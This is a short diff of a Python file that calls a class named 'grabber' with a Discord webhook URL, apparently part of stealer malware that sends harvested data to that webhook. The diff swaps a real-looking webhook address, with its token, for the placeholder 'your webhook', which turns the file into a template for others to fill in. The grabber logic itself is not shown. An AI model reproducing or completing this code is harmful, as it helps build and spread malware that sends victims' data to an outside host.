@@ -425,4 +425,4 @@ class grabber:
 
 
 grabber(
-    "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
+    "your webhook")
